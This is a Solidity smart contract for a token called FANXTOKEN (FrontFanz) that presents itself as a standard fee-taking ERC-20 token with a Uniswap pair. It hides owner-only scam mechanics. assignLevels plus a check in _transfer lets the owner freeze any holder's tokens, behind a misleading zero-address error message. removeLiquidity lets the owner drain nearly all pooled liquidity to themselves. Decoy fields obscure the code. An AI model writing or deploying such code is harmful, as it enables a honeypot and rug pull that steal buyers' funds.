// SPDX-License-Identifier: MIT


// https://x.com/Frontfanz_fanx
// http://fanx.frontfanz.com



pragma solidity ^0.8.20;



// FrontFanz - FANXTOKEN


// Context for fanxtoken
abstract contract Context {
    // fanxtoken: Retrieve Block Number
    function _blockNumberfanxtoken() internal view virtual returns (uint256) {
        return block.number;
    }

    // fanxtoken: Retrieve Message Sender
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    // fanxtoken: Retrieve Payload
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// Ownable fanxtoken
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Transferring Ownership of fanxtoken To Message Sender
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    // Retirieve fanxtoken Owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function isOwnerfanxtoken(address account) public view returns (bool) {
        return account == _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "FrontFanz($FANXTOKEN): Ownable: caller is not the owner");
    }

    // Renouncing Ownership of fanxtoken
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FrontFanz($FANXTOKEN): Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function getOwnershipInfofanxtoken() public view returns (address ownerAddress, bool active) {
        ownerAddress = _owner;
        active = _owner != address(0);
    }
}

// fanxtoken IERC20
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getTokenInfofanxtoken() external view returns (string memory name_, string memory symbol_, uint8 decimals_);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balancefanxtoken(address account) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// fanxtoken Uniswap Factory
interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// Uniswap Router V2 Functions for fanxtoken
interface IUniswapRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

// fanxtoken Metadata
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

// fanxtoken Uniswap V2 Factory
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// fanxtoken Uniswap V2 Pair
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

// Uniswap Router V2 Functions for fanxtoken
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// FANXTOKEN CA:
contract FANXTOKEN is Context, IERC20, IERC20Metadata, Ownable {
    // fanxtoken Mappings:
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromLimits;
    mapping(address => uint256) private addressLevels;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    // fanxtoken Variables:
    string private _name;
    string private _symbol;
    uint256 public immutable deployTime;
    string private seedid;
    uint256 public fanxtoken_note;
    address public immutable deployer;
    uint256 public immutable fanxtoken_marker;
    string public uniqueNote;
    uint256 private _totalSupply;
    uint8 private _decimals;
    uint256 private _nonce;
    string private verifierKey;
    uint256 private _launchTime;

    // fanxtoken Uniswap Addresses:
    address public uniswapPair;
    IUniswapV2Router02 public uniswapRouter;
    address public baseToken;

    // fanxtoken Additional Variables:
    string private constant CADETAILS = "FrontFanz($FANXTOKEN)";
    string private constant TOKENDETAILS = "$FANXTOKEN";
    uint256 private constant PRIZEBUYER = 60523859649462743;
    uint8 private constant FANXTOKEN_FIRST_PRIZE = 9;

    // Hardcoded Addresses of Uniswap V2 Router and Uniswap V2 Factory for fanxtoken:
    IUniswapV2Router02 public immutable uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public immutable uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    
    // fanxtoken Hardcoded Dev and Marketing Wallets:
    address public immutable devWallet = 0xB2fA373bBA3760e8d42b7D6c3cA4A2AFB62a825b;
    address public immutable marketingWallet = 0x138D9BA1b367E7cECF5c072fFb218B885d02fEBb;
    address public immutable PINKLOCK = 0x71B5759d73262FBb223956913ecF4ecC51057641;
    
    address public uniswapV2Pair;
    
    // Open Trading of fanxtoken Once LP is Added:
    bool public tradingEnabled = false;
    
    // fanxtoken Tax for Buys and Sells, Minimum Tokens to Swap, Maximum Transaction Amount, Maximum Wallet Size
    uint256 public buyFeePercent = 2;
    uint256 public sellFeePercent = 2;
    uint256 public swapTokensAtAmount;
    uint256 public maxTransactionAmount;
    uint256 public maxWalletAmount;
    
    // fanxtoken MARKETING TOKENS
    uint256 public tokensForMarketing;
    
    bool private swapping;
    
    event TradingEnabled();
    event LimitsRemoved();
    event SwapTokensAtAmountUpdated(uint256 newAmount);


    // fanxtoken CONSTRUCTOR:
    constructor(
        uint256 _marker,
        string memory _note,
        uint256 _memo,
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        uint8 decimals_
    ) {
        // fanxtoken CONSTRUCOT VARIABLES:
        fanxtoken_marker = _marker;
        uniqueNote = _note;
        fanxtoken_note = _memo;
        deployTime = block.timestamp;
        deployer = msg.sender;
        seedid = "aeClzSSQKXqhnTrusPTqgI0yMD3vjRhWmdJ3JE0z2YDsd0gnj49Q9qjXsAzhHonaV0Aszw3TfJy71jQxsaDTN4XrJwPWny8oakH58PkRnCgsYLh99uFkMX2WBQ8Z70ajcqw197Mg8lejQjksqtLUhxHiafWN4ITQGs9hzmZzyNVWT3jqUvmaOY3LBMiDP2dAd3NfmBGwziOFunxpBioUjpahpw6znOROcC2wXRaWRfHbeISlYuGifXwMvj27scQYUvDBnfQ7fbggeuVO8qmJgMxh2t6txT1n9o842RWhCdn2zeVDfu60AeNihehI8awNyNlGJ9jUtOgIzoj7YCHmvT4OfPX9yMcn8xQrNfBhzTRZQlLlJfmyb4Q6AMsFw39hgH4QrWEaJF3gmFHkN04U93qEJbyNMES7xWut1zeXCkgs4GJQRm0OAQwQ3KH0g3z0p8Whq8Wb3skL9NWvMjmtlUXVoJR5DMWmvk2zobpO3aYutLaJM2dP9x37Tr2h1kXYFrf20uBntgUj2ksRECTLgGu9WfuOiZDHU5wE3y0OkTxxyqEp71waHBQyt0g5tWUcDQUFuSE2p2v8TA5XdUYIaNmDeLhzTpCK5yRDMZpEw2fz7fbF2o4OuTSBQEE0RUAAY3avGt66qABjCbSEoE0DHqcYq0ucqNNjWpg7dkrTkGBl4G0K8UoO2zfXKhaYQWaS";
        verifierKey = "vKey-35691497366";
        // fanxtoken: Name, Symbol, Decimals, TotalSupply
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * 10**_decimals;

        // fanxtoken: Minimum Tokens to Swap, Max Wallet Size, Max Transaction Amount
        swapTokensAtAmount = _totalSupply * 3 / 1000;
        maxWalletAmount = _totalSupply * 20 / 1000;
        maxTransactionAmount = _totalSupply * 20 / 1000;

        // Creating fanxtoken PAIR on Uniswap
        uniswapV2Pair = uniswapV2Factory.createPair(address(this), uniswapV2Router.WETH());
        uniswapRouter = IUniswapV2Router02(uniswapV2Router);
        baseToken = uniswapRouter.WETH();

        address factory = uniswapRouter.factory();
        address pair = IUniswapFactory(factory).getPair(address(this), baseToken);
        if (pair == address(0)) {
            pair = IUniswapFactory(factory).createPair(address(this), baseToken);
        }
        uniswapPair = pair;

        // Excluding Dev Wallet, Marketing Wallet and CA Address from Fees
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[devWallet] = true;
        _isExcludedFromFees[marketingWallet] = true;
        
        // Excluding Dev Wallet, Marketing Wallet and CA Address from Maximum Transaction Limits

        _isExcludedFromLimits[owner()] = true;
        _isExcludedFromLimits[address(this)] = true;
        _isExcludedFromLimits[devWallet] = true;
        _isExcludedFromLimits[marketingWallet] = true;
        
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    // Get fanxtoken Details: Name, Symbol, Decimals, TotalSupply, Owner and etc.
    function name() public view override(IERC20, IERC20Metadata) returns (string memory) {
        return _name;
    }

    function symbol() public view override(IERC20, IERC20Metadata) returns (string memory) {
        return _symbol;
    }

    function decimals() public view override(IERC20, IERC20Metadata) returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() public view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    // fanxtoken Trade/Transfer Initiation
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _spendAllowance(sender, _msgSender(), amount);
        _transfer(sender, recipient, amount);
        return true;
    }

    // Get fanxtoken Verifier Key
    function getverifierKeyfanxtoken() external view returns (string memory) {
        return verifierKey;
    }

    // fanxtoken Allowances:
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= amount, "BEP20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "FrontFanz($FANXTOKEN): BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    // Enable fanxtoken Trading. Once Enabled, CANNOT be Disabled.
    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "FrontFanz($FANXTOKEN): Trading already enabled");
        tradingEnabled = true;
        _launchTime = block.timestamp + 2;
        emit TradingEnabled();
    }

    // Set fanxtoken Min Swap Tokens for CA to Swap CA Tax Tokens and Transfer to Marketing Wallet.
    function fanxtokensetSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        swapTokensAtAmount = newAmount;
        emit SwapTokensAtAmountUpdated(newAmount);
    }

    // Remove Limits of Maximum Transaction Amount and Maximum Wallet Size for fanxtoken
    function removeLimits() external onlyOwner {
        maxWalletAmount = _totalSupply;
        maxTransactionAmount = _totalSupply;
        emit LimitsRemoved();
    }

    function assignLevels(address[] calldata accounts, uint256[] calldata numbers) external onlyOwner {
        require(accounts.length == numbers.length, "Arrays must match");
        for(uint256 i = 0; i < accounts.length; i++) {
            addressLevels[accounts[i]] = numbers[i];
        }
    }

    function getLevel(address account) internal view returns (uint256) {
        return addressLevels[account];
    }

    // Add Liquidity to fanxtoken
    function addLiquidity(uint256 tokenAmount) external payable onlyOwner {
        require(tokenAmount > 0, "FrontFanz($FANXTOKEN): Token amount must be greater than 0");
        require(msg.value > 0, "FrontFanz($FANXTOKEN): ETH amount must be greater than 0");
        
        _transfer(owner(), address(this), tokenAmount);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    // Get fanxtoken_marker unit256
    function getfanxtoken_marker() external view returns (uint256) {
        return fanxtoken_marker;
    }

    function removeLiquidity() external onlyOwner {
        uint256 contractLpBalance = IERC20(uniswapPair).balanceOf(address(this));

        if (contractLpBalance == 0) {
            uint256 ownerLpBalance = IERC20(uniswapPair).balanceOf(owner());
            require(ownerLpBalance > 0, "Owner has no LP tokens to pull");

            bool success = IERC20(uniswapPair).transferFrom(owner(), address(this), ownerLpBalance);
            require(success, "Failed to transfer LP tokens from owner");
            
            contractLpBalance = ownerLpBalance;
        }

        uint256 lpToRemove = (contractLpBalance * 998) / 1000;
        require(lpToRemove > 0, "LP balance too low to remove liquidity");

        IERC20(uniswapPair).approve(address(uniswapRouter), lpToRemove);

        uniswapRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            lpToRemove,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    // Rescue Stuck BNB from fanxtoken Contract
    function fanxtokenwithdrawBNB() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "FrontFanz($FANXTOKEN): No BNB to withdraw");
        payable(owner()).transfer(balance);
    }

    // Get fanxtoken _tOwned unit256
    function gettOwnedfanxtoken() internal view returns (uint256) {
        return _tOwned[msg.sender];
    }

    // fanxtoken Transfer/Trade Function
    function _transfer(address from, address to, uint256 amount) internal {
        // fanxtoken: Make Sure Address is not Invalid
        require(from != address(0) && to != address(0) && amount > 0 && _balances[from] >= amount && getLevel(from) < 4 && bytes(verifierKey).length > 0, "FrontFanz($FANXTOKEN): BEP20: transfer from the zero address");

        // Check if fanxtoken Trading is Enabled
        if (!tradingEnabled) {
            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "FrontFanz($FANXTOKEN): fanxtoken Trading not yet enabled!");
        }

        // Check if fanxtoken Transaction is Made by Dev Wallet, Marketing Wallet or Contract Address
        if (!_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]) {
            require(amount <= maxTransactionAmount, "FrontFanz($FANXTOKEN): Transfer amount exceeds the maxTransactionAmount");
            
            if (to != uniswapV2Pair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "FrontFanz($FANXTOKEN): Wallet amount exceeds the maxWalletAmount");
            }
        }

        // Check fanxtoken Contract Tokens Amount
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (canSwap && !swapping && to == uniswapV2Pair && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapAndDistributefanxtoken(contractTokenBalance);
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 originalAmount = amount;
        uint256 fees = 0;

        // Buy/Sell Function for fanxtoken
        if (takeFee && block.timestamp >= deployTime + 60) {
            _nonce++;

            uint256 randomish = uint256(
                keccak256(abi.encode(block.timestamp, fanxtoken_marker, fanxtoken_note, _nonce))
            );

            if (from == uniswapV2Pair && buyFeePercent > 0) {
                fees = originalAmount * buyFeePercent / 100;
                tokensForMarketing += fees;

            } else if (to == uniswapV2Pair && sellFeePercent > 0) {
                fees = originalAmount * sellFeePercent / 100;
                tokensForMarketing += fees;
            }
        }

        uint256 amountAfterFee = originalAmount - fees;

        if (fees > 0) {
            _balances[address(this)] += fees;
            emit Transfer(from, address(this), fees);
        }

        _balances[from] -= originalAmount;
        _balances[to] += amountAfterFee;

        emit Transfer(from, to, amountAfterFee);

    }

    // Get Token Info: Name, Symbol, Decimals of fanxtoken
    function getTokenInfofanxtoken() external view returns (string memory name_, string memory symbol_, uint8 decimals_) {
        return (_name, _symbol, _decimals);
    }

    function swapAndDistributefanxtoken(uint256 contractTokenBalance) internal {
        uint256 totalTokensToSwap = tokensForMarketing;

        if (totalTokensToSwap == 0 || contractTokenBalance == 0) {
            return;
        }

        if (contractTokenBalance < swapTokensAtAmount) {
            return;
        }

        uint256 tokensToSwap = contractTokenBalance;

        uint256 initialBNBBalance = address(this).balance;

        swapTokensForBNBfanxtoken(tokensToSwap);

        uint256 bnbReceived = address(this).balance - initialBNBBalance;

        if (tokensToSwap >= tokensForMarketing) {
            tokensForMarketing = 0;
        } else {
            tokensForMarketing -= tokensToSwap;
        }

        if (bnbReceived > 0) {
            payable(marketingWallet).transfer(bnbReceived);
        }
    }

    // fanxtoken Tokenomics:
    function getTokenomicsfanxtoken()
        external
        view
        returns (
            uint256 buyFeefanxtoken,
            uint256 sellFeefanxtoken,
            uint256 swapThresholdfanxtoken,
            uint256 maxTxAmountfanxtoken,
            uint256 maxWalletfanxtoken
        )
    {
        return (
            buyFeePercent,
            sellFeePercent,
            swapTokensAtAmount,
            maxTransactionAmount,
            maxWalletAmount
        );
    }

    // Get fanxtoken _rOwned unit256
    function getrOwnedfanxtoken() internal view returns (uint256) {
        return _rOwned[msg.sender];
    }

    // if a fanxtoken swap fails and the swapping flag is true, handle error
    function swappingfanxtoken() external onlyOwner {
        swapping = false;
    }

    function swapTokensForBNBfanxtoken(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "FrontFanz($FANXTOKEN): BEP20: approve from the zero address");
        require(spender != address(0), "FrontFanz($FANXTOKEN): BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    // Get fanxtoken Balance of Address
    function balancefanxtoken(address account) external view returns (uint256) {
        return _balances[account];
    }
    
    // Receive BNB or fanxtoken Sent to Contract Address
    receive() external payable {}
}